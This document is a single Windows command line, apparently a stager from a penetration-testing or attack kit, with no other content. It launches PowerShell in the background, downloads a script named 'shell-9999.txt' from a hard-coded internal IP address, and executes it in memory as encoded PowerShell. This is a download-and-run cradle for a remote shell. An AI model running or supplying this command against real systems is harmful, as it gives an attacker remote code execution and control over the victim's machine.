START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.17.4.179:8000/shell-9999.txt');iex 'powershell -E $code'
